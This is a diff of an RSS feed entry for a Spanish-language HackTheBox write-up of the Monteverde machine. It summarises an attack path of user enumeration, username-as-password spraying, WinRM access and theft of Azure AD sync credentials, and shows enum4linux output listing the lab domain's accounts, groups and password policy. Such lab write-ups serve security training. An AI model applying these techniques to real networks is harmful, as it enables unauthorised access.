@@ -29,9 +29,8 @@
         
         <atom:modified>Sat, 13 Jun 2020 00:00:00 +0000</atom:modified>
         <guid>https://sckull.github.io/posts/monteverde/</guid>
-        <description>Monteverde es una maquina de HackTheBox aqui encontrarás la solucion para obtener la flag user.txt y root.txt.</description>
-        <content:encoded>&lt;p&gt;Monteverde es una maquina de HackTheBox aqui encontrarás la solucion para obtener la flag user.txt y root.txt.&lt;/p&gt;
-
+        <description>Monteverde expone SMB y LDAP donde obtuvimos una lista de usuarios los cuales utilizamos como contraseña para enumerar SMB y obtener credenciales almacenadas que nos dieron acceso por WinRM.</description>
+        <content:encoded>
 
 
 
@@ -43,6 +42,7 @@
     &lt;img src=&#34;https://sckull.github.io/images/posts/htb/monteverde/cover.webp&#34; alt=&#34;featured image&#34; class=&#34;featured-image&#34; style=&#34;width: ;height: ;&#34;&gt;
   &lt;/div&gt;
 
+&lt;p&gt;Monteverde expone SMB y LDAP donde obtuvimos una lista de usuarios los cuales utilizamos como contraseña para enumerar SMB y obtener credenciales almacenadas que nos dieron acceso por WinRM. El usuario pertenece al grupo Azure Admins lo que permitio conectarnos a la base de datos y obtener credenciales para obtener acceso privilegiado.&lt;/p&gt;
 &lt;h1 id=&#34;informacion-de-la-maquina&#34;&gt;Informacion de la Maquina&lt;/h1&gt;
 &lt;table&gt;
 &lt;thead&gt;
@@ -208,7 +208,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 &lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
 &lt;/div&gt;&lt;h2 id=&#34;enum4linux&#34;&gt;ENUM4LINUX&lt;/h2&gt;
-&lt;p&gt;Vemos que tenemos muchos puertos por enumerar vamos a iniciar con windows en samba con enum4linux, enumerando los usuarios dentro de la maquina.&lt;/p&gt;
+&lt;p&gt;Vemos que tenemos muchos puertos por enumerar vamos a iniciar con windows en samba y ldap con enum4linux, enumerando los usuarios dentro de la maquina.&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
 &lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;  1
@@ -398,268 +398,198 @@ Service detection performed. Please report any incorrect results at https://nmap
 &lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;185
 &lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;186
 &lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;187
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;188
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;189
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;190
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;191
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;192
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;193
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;194
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;195
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;196
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;197
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;198
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;199
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;200
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;201
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;202
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;203
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;204
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;205
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;206
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;207
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;208
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;209
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;210
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;211
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;212
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;213
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;214
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;215
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;216
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;217
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;218
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;219
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;220
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;221
-&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;222
 &lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
 &lt;td class=&#34;lntd&#34;&gt;
-&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;Starting enum4linux v0.8.9 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt; http://labs.portcullis.co.uk/application/enum4linux/ &lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; on Sat Jan &lt;span class=&#34;m&#34;&gt;18&lt;/span&gt; 19:15:47 &lt;span class=&#34;nv&#34;&gt;2020&lt;/span&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;Starting enum4linux v0.8.9 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt; http://labs.portcullis.co.uk/application/enum4linux/ &lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; on Sat Jan &lt;span class=&#34;m&#34;&gt;18&lt;/span&gt; 19:15:47 &lt;span class=&#34;m&#34;&gt;2020&lt;/span&gt;
 
- &lt;span class=&#34;o&#34;&gt;==========================&lt;/span&gt; 
-&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;    Target Information    &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
- &lt;span class=&#34;o&#34;&gt;==========================&lt;/span&gt; 
-Target ........... 10.10.10.172
-RID Range ........ 500-550,1000-1050
-Username ......... &lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;
-Password ......... &lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;
-Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, &lt;span class=&#34;nv&#34;&gt;none&lt;/span&gt;
+&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt; ... REDACTED ... &lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; 
 
+ &lt;span class=&#34;o&#34;&gt;===========================================&lt;/span&gt; 
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;    Getting domain SID &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; 10.10.10.172    &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
+ &lt;span class=&#34;o&#34;&gt;===========================================&lt;/span&gt; 
+Domain Name: MEGABANK
+Domain Sid: S-1-5-21-391775091-850290835-3566037492
+&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Host is part of a domain &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;not a workgroup&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
 
- &lt;span class=&#34;o&#34;&gt;====================================================&lt;/span&gt; 
-&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;    Enumerating Workgroup/Domain on 10.10.10.172    &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
- &lt;span class=&#34;o&#34;&gt;====================================================&lt;/span&gt; 
-&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;E&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Can&lt;span class=&#34;s1&#34;&gt;&amp;#39;t find workgroup/domain
+ &lt;span class=&#34;o&#34;&gt;======================================&lt;/span&gt; 
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;    OS information on 10.10.10.172    &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
+ &lt;span class=&#34;o&#34;&gt;======================================&lt;/span&gt; 
+&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Got OS info &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; 10.10.10.172 from smbclient: 
+&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Got OS info &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; 10.10.10.172 from srvinfo:
+Could not initialise srvsvc. Error was &lt;span class=&#34;nv&#34;&gt;NT_STATUS_ACCESS_DENIED&lt;/span&gt;
+
+ &lt;span class=&#34;o&#34;&gt;=============================&lt;/span&gt; 
+&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;    Users on 10.10.10.172    &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
+ &lt;span class=&#34;o&#34;&gt;=============================&lt;/span&gt; 
+index: 0xfb6 RID: 0x450 acb: 0x00000210 Account: AAD_987d7f2f57d2	Name: AAD_987d7f2f57d2	Desc: Service account &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; the Synchronization Service with installation identifier 05c97990-7587-4a3d-b312-309adfc172d9 running on computer MONTEVERDE.
+index: 0xfd0 RID: 0xa35 acb: 0x00000210 Account: dgalanos	Name: Dimitris Galanos	Desc: &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;null&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+index: 0xedb RID: 0x1f5 acb: 0x00000215 Account: Guest	Name: &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;null&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;	Desc: Built-in account &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; guest access to the computer/domain
+index: 0xfc3 RID: 0x641 acb: 0x00000210 Account: mhope	Name: Mike Hope	Desc: &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;null&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+index: 0xfd1 RID: 0xa36 acb: 0x00000210 Account: roleary	Name: Ray O&lt;span class=&#34;s1&#34;&gt;&amp;#39;Leary	Desc: (null)
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;index: 0xfc5 RID: 0xa2a acb: 0x00000210 Account: SABatchJobs	Name: SABatchJobs	Desc: (null)
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;index: 0xfd2 RID: 0xa37 acb: 0x00000210 Account: smorgan	Name: Sally Morgan	Desc: (null)
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;index: 0xfc6 RID: 0xa2b acb: 0x00000210 Account: svc-ata	Name: svc-ata	Desc: (null)
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;index: 0xfc7 RID: 0xa2c acb: 0x00000210 Account: svc-bexec	Name: svc-bexec	Desc: (null)
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;index: 0xfc8 RID: 0xa2d acb: 0x00000210 Account: svc-netapp	Name: svc-netapp	Desc: (null)
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;user:[Guest] rid:[0x1f5]
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;user:[AAD_987d7f2f57d2] rid:[0x450]
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;user:[mhope] rid:[0x641]
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;user:[SABatchJobs] rid:[0xa2a]
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;user:[svc-ata] rid:[0xa2b]
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;user:[svc-bexec] rid:[0xa2c]
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;user:[svc-netapp] rid:[0xa2d]
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;user:[dgalanos] rid:[0xa35]
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;user:[roleary] rid:[0xa36]
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;user:[smorgan] rid:[0xa37]
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt; ========================================= 
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;|    Share Enumeration on 10.10.10.172    |
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt; ========================================= 
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;	Sharename       Type      Comment
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;	---------       ----      -------
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;SMB1 disabled -- no workgroup available
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;[+] Attempting to map shares on 10.10.10.172
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt; ==================================================== 
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;|    Password Policy Information for 10.10.10.172    |
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt; ==================================================== 
 &lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;
 &lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;
-&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt; ============================================ 
-&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;|    Nbtstat Information for 10.10.10.172    |
-&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt; ============================================ 
-&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;Looking up status of 10.10.10.172
-&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;No reply from 10.10.10.172
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;[+] Attaching to 10.10.10.172 using a NULL share
 &lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;
-&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt; ===================================== 
-&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;|    Session Check on 10.10.10.172    |
-&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt; ===================================== 
-&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;[+] Server 10.10.10.172 allows sessions using username &amp;#39;&amp;#39;, password &amp;#39;&amp;#39;
-&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;[+] Got domain/workgroup name: 
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;[+] Trying protocol 445/SMB...
 &lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;
-&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt; =========================================== 
-&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;|    Getting domain SID for 10.10.10.172    |
-&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt; =========================================== 
-&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;Domain Name: MEGABANK
-&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;Domain Sid: S-1-5-21-391775091-850290835-3566037492
-&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;[+] Host is part of a domain (not a workgroup)
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;[+] Found domain(s):
 &lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;
-&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt; ====================================== 
-&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;|    OS information on 10.10.10.172    |
-&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt; ====================================== 
-&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;[+] Got OS info for 10.10.10.172 from smbclient: 
-&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;[+] Got OS info for 10.10.10.172 from srvinfo:
-&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;Could not initialise srvsvc. Error was NT_STATUS_ACCESS_DENIED
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;	[+] MEGABANK
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;	[+] Builtin
 &lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;
-&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt; ============================= 
-&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;|    Users on 10.10.10.172    |
-&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt; ============================= 
-&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;index: 0xfb6 RID: 0x450 acb: 0x00000210 Account: AAD_987d7f2f57d2	Name: AAD_987d7f2f57d2	Desc: Service account for the Synchronization Service with installation identifier 05c97990-7587-4a3d-b312-309adfc172d9 running on computer MONTEVERDE.
-&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;index: 0xfd0 RID: 0xa35 acb: 0x00000210 Account: dgalanos	Name: Dimitris Galanos	Desc: (null)
-&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;index: 0xedb RID: 0x1f5 acb: 0x00000215 Account: Guest	Name: (null)	Desc: Built-in account for guest access to the computer/domain
-&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;index: 0xfc3 RID: 0x641 acb: 0x00000210 Account: mhope	Name: Mike Hope	Desc: (null)
-&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;index: 0xfd1 RID: 0xa36 acb: 0x00000210 Account: roleary	Name: Ray O&amp;#39;&lt;/span&gt;Leary	Desc: &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;null&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
-index: 0xfc5 RID: 0xa2a acb: 0x00000210 Account: SABatchJobs	Name: SABatchJobs	Desc: &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;null&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
-index: 0xfd2 RID: 0xa37 acb: 0x00000210 Account: smorgan	Name: Sally Morgan	Desc: &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;null&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
-index: 0xfc6 RID: 0xa2b acb: 0x00000210 Account: svc-ata	Name: svc-ata	Desc: &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;null&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
-index: 0xfc7 RID: 0xa2c acb: 0x00000210 Account: svc-bexec	Name: svc-bexec	Desc: &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;null&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
-index: 0xfc8 RID: 0xa2d acb: 0x00000210 Account: svc-netapp	Name: svc-netapp	Desc: &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;null&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;[+] Password Info for Domain: MEGABANK
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;	[+] Minimum password length: 7
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;	[+] Password history length: 24
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;	[+] Maximum password age: 41 days 23 hours 53 minutes 
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;	[+] Password Complexity Flags: 000000
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;		[+] Domain Refuse Password Change: 0
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;		[+] Domain Password Store Cleartext: 0
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;		[+] Domain Password Lockout Admins: 0
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;		[+] Domain Password No Clear Change: 0
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;		[+] Domain Password No Anon Change: 0
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;		[+] Domain Password Complex: 0
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;	[+] Minimum password age: 1 day 4 minutes 
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;	[+] Reset Account Lockout Counter: 30 minutes 
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;	[+] Locked Account Duration: 30 minutes 
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;	[+] Account Lockout Threshold: None
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;	[+] Forced Log off Time: Not Set
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;[+] Retieved partial password policy with rpcclient:
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;Password Complexity: Disabled
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;Minimum Password Length: 7
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt; ============================== 
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;|    Groups on 10.10.10.172    |
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt; ============================== 
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;[+] Getting builtin groups:
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;group:[Pre-Windows 2000 Compatible Access] rid:[0x22a]
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;group:[Incoming Forest Trust Builders] rid:[0x22d]
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;group:[Windows Authorization Access Group] rid:[0x230]
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;group:[Terminal Server License Servers] rid:[0x231]
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;group:[Users] rid:[0x221]
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;group:[Guests] rid:[0x222]
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;group:[Remote Desktop Users] rid:[0x22b]
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;group:[Network Configuration Operators] rid:[0x22c]
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;group:[Performance Monitor Users] rid:[0x22e]
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;group:[Performance Log Users] rid:[0x22f]
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;group:[Distributed COM Users] rid:[0x232]
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;group:[IIS_IUSRS] rid:[0x238]
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;group:[Cryptographic Operators] rid:[0x239]
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;group:[Event Log Readers] rid:[0x23d]
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;group:[Certificate Service DCOM Access] rid:[0x23e]
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;group:[RDS Remote Access Servers] rid:[0x23f]
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;group:[RDS Endpoint Servers] rid:[0x240]
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;group:[RDS Management Servers] rid:[0x241]
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;group:[Hyper-V Administrators] rid:[0x242]
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;group:[Access Control Assistance Operators] rid:[0x243]
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;group:[Remote Management Users] rid:[0x244]
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;group:[Storage Replica Administrators] rid:[0x246]
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;[+] Getting builtin group memberships:
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;Group &amp;#39;&lt;/span&gt;IIS_IUSRS&lt;span class=&#34;s1&#34;&gt;&amp;#39; (RID: 568) has member: Couldn&amp;#39;&lt;/span&gt;t lookup SIDs
+Group &lt;span class=&#34;s1&#34;&gt;&amp;#39;Guests&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;RID: 546&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; has member: Couldn&lt;span class=&#34;s1&#34;&gt;&amp;#39;t lookup SIDs
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;Group &amp;#39;&lt;/span&gt;Incoming Forest Trust Builders&lt;span class=&#34;s1&#34;&gt;&amp;#39; (RID: 557) has member: Could not initialise pipe samr. Error was NT_STATUS_INVALID_NETWORK_RESPONSE
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;Group &amp;#39;&lt;/span&gt;Pre-Windows &lt;span class=&#34;m&#34;&gt;2000&lt;/span&gt; Compatible Access&lt;span class=&#34;s1&#34;&gt;&amp;#39; (RID: 554) has member: Couldn&amp;#39;&lt;/span&gt;t lookup SIDs
+Group &lt;span class=&#34;s1&#34;&gt;&amp;#39;Windows Authorization Access Group&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;RID: 560&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; has member: Couldn&lt;span class=&#34;s1&#34;&gt;&amp;#39;t lookup SIDs
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;Group &amp;#39;&lt;/span&gt;Remote Management Users&lt;span class=&#34;s1&#34;&gt;&amp;#39; (RID: 580) has member: Couldn&amp;#39;&lt;/span&gt;t lookup SIDs
+Group &lt;span class=&#34;s1&#34;&gt;&amp;#39;Users&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;RID: 545&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; has member: Couldn&lt;span class=&#34;s1&#34;&gt;&amp;#39;t lookup SIDs
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;[+] Getting local groups:
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;group:[Cert Publishers] rid:[0x205]
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;group:[RAS and IAS Servers] rid:[0x229]
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;group:[Allowed RODC Password Replication Group] rid:[0x23b]
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;group:[Denied RODC Password Replication Group] rid:[0x23c]
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;group:[DnsAdmins] rid:[0x44d]
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;group:[SQLServer2005SQLBrowserUser$MONTEVERDE] rid:[0x44f]
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;group:[ADSyncAdmins] rid:[0x451]
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;group:[ADSyncOperators] rid:[0x452]
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;group:[ADSyncBrowse] rid:[0x453]
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;group:[ADSyncPasswordSet] rid:[0x454]
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;[+] Getting local group memberships:
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;Group &amp;#39;&lt;/span&gt;ADSyncAdmins&lt;span class=&#34;s1&#34;&gt;&amp;#39; (RID: 1105) has member: Couldn&amp;#39;&lt;/span&gt;t lookup SIDs
+Group &lt;span class=&#34;s1&#34;&gt;&amp;#39;Denied RODC Password Replication Group&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;RID: 572&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; has member: Couldn&lt;span class=&#34;s1&#34;&gt;&amp;#39;t lookup SIDs
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;[+] Getting domain groups:
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;group:[Enterprise Read-only Domain Controllers] rid:[0x1f2]
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;group:[Domain Users] rid:[0x201]
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;group:[Domain Guests] rid:[0x202]
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;group:[Domain Computers] rid:[0x203]
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;group:[Group Policy Creator Owners] rid:[0x208]
+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;group:[Cloneable Domain Controllers] rid:[0x20a]
